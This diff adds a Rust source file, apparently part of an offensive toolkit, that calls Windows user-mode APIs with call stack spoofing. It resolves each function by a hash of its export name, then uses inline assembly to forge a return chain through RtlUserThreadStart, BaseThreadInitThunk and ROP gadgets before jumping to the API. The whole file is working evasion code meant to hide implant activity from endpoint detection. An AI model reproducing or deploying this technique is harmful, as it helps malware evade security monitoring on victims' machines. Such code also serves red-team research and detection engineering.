@@ -1,0 +1,160 @@
+use crate::techniques::evasion::dinamic_api_resolution::get_export_by_name_hash;
+use crate::techniques::evasion::stack_spoofing::call_stack_spoofing::*;
+use std::arch::asm;
+
+/* IMPLEMENTACION DE CALL PARA FUNCIONES USER MODE (SIN SYSCALL) CON CALL STACK SPOOFING by lcalzada-xor*/
+
+#[cfg(target_arch = "x86_64")] 
+pub fn user_mode_call_with_spoof(
+    module_base: *const u8,
+    api_hash: u32,
+    a1: usize,
+    a2: usize,
+    a3: usize,
+    a4: usize,
+    a5: usize,
+    a6: usize,
+    a7: usize,
+    a8: usize,
+) -> Result<usize, String> {
+    let address_api = match get_export_by_name_hash(module_base, api_hash) {
+        Ok(addr) => addr,
+        Err(e) => return Err(format!("Api with hash {:#08x} not found: {}", api_hash, e)),
+    };
+
+    // calculamos la estructura con toda la info de call stack spoofing
+    let mut spoof_data = match prepare_spoof_data() {
+        Ok(data) => data,
+        Err(e) => return Err(format!("Failed to prepare spoof data: {}", e)),
+    };
+    spoof_data.a5 = a5;
+    spoof_data.a6 = a6;
+    spoof_data.a7 = a7;
+    spoof_data.a8 = a8;
+    let spoof_ptr = &spoof_data as *const SpoofData;
+    let mut status: usize;
+
+    /*
+    #[cfg(debug_assertions)]
+    println!(
+        "[Debug] Syscall Info: , ApiAddr={:?}, ApiHash={:#x}, SpoofData={:?}",
+        address_api, api_hash, spoof_data
+    );
+    */
+    // luego para volver se usa un gadget add rsp, 0x28  ; (o el tamaño que se necesite) ret -> a esto se le llama buscar gadgets
+    macro_rules! execute_user_callwith_spoof {
+        ($save_rsp:expr, $restore_rsp:expr, $anchor_lea:expr, $save_reg_name:tt, $anchor_reg_name:tt) => {
+
+            asm!(
+
+                $save_rsp,
+
+                "mov r11, [{spoof_ptr_reg} + 0x00]", // pillamos el tamaño de la pila a agrandar para spoofear
+                "sub rsp, r11", // agrandamos el tamaño de la pila
+
+                // se aprovecha de el ultimo espacio del stack para guardar las vars, muy loco!!!
+                "mov r10, [{spoof_ptr_reg} + 0x50]",
+                "mov [rsp + 0x28], r10",  // a5"
+
+                "mov r10, [{spoof_ptr_reg} + 0x58]",
+                "mov [rsp + 0x30], r10",  // a6
+
+                "mov r10, [{spoof_ptr_reg} + 0x60]",
+                "mov [rsp + 0x38], r10",  // a7
+
+                "mov r10, [{spoof_ptr_reg} + 0x68]",
+                "mov [rsp + 0x40], r10", // a8
+
+                //  RtlUserThreadStart
+                "mov r10, [{spoof_ptr_reg} + 0x08]",   // pos1
+                "mov r11, [{spoof_ptr_reg} + 0x10]",  // fn_addr_1
+                "mov [rsp + r10], r11",
+
+                "mov r10, [{spoof_ptr_reg} + 0x48]",   // null_ret_offset
+                "mov qword ptr [rsp + r10], 0", // metemos un 0 aqui para que termine el unwind del stack
+
+                //  BaseThreadInitThunk
+                "mov r10, [{spoof_ptr_reg} + 0x18]",   // pos2
+                "mov r11, [{spoof_ptr_reg} + 0x20]",   // fn_addr_2
+                "mov [rsp + r10], r11",
+                //  gadget 1
+                "mov r10, [{spoof_ptr_reg} + 0x28]",   // pos3
+                "mov r11, [{spoof_ptr_reg} + 0x30]",   // fn_addr_3
+                "mov [rsp + r10], r11",
+                // gadget 2
+                "mov r10, [{spoof_ptr_reg} + 0x38]",   // pos4
+                "mov r11, [{spoof_ptr_reg} + 0x40]",   // fn_addr_4
+                "mov [rsp + r10], r11",
+
+
+
+                $anchor_lea, // Dinámico: "lea rbx, [rip + 2f]", etc
+
+                "jmp {api_address}",         // saltamos a la addr de la api
+
+                "2:",
+                "nop",
+                $restore_rsp,
+
+                api_address = in(reg) address_api,
+                spoof_ptr_reg = in(reg) spoof_ptr, // struct de la config (nos deja manejar en un solo registro mucha config)
+                in("r13") a5,
+                in("r14") a6,
+                inout("rcx") a1 => _,
+                inout("rdx") a2 => _,
+                inout("r8") a3 => _,
+                inout("r9") a4 => _,
+                out("r10") _,
+                out("r11") _,
+                lateout("rax") status,
+                out($save_reg_name) _,
+                out($anchor_reg_name) _,
+                clobber_abi("win64")
+            )
+
+        }
+    }
+    unsafe {
+        // si el gadget es R12, usamos RDI para guardar la pila
+        // seleccion de que instruccion usar para guardar el rsp
+        match spoof_data.anchor_register {
+            Reg::Rdi => {
+                execute_user_callwith_spoof!(
+                    "mov r12, rsp",
+                    "mov rsp, r12",
+                    "lea rdi, [rip + 2f]",
+                    "r12",
+                    "rdi"
+                )
+            }
+            Reg::Rsi => {
+                execute_user_callwith_spoof!(
+                    "mov r12, rsp",
+                    "mov rsp, r12",
+                    "lea rsi, [rip + 2f]",
+                    "r12",
+                    "rsi"
+                )
+            }
+            Reg::R15 => {
+                execute_user_callwith_spoof!(
+                    "mov r12, rsp",
+                    "mov rsp, r12",
+                    "lea r15, [rip + 2f]",
+                    "r12",
+                    "r15"
+                )
+            }
+            Reg::R12 => {
+                execute_user_callwith_spoof!(
+                    "mov rdi, rsp",
+                    "mov rsp, rdi",
+                    "lea r12, [rip + 2f]",
+                    "rdi",
+                    "r12"
+                )
+            }
+        }
+    }
+    Result::Ok(status)
+}
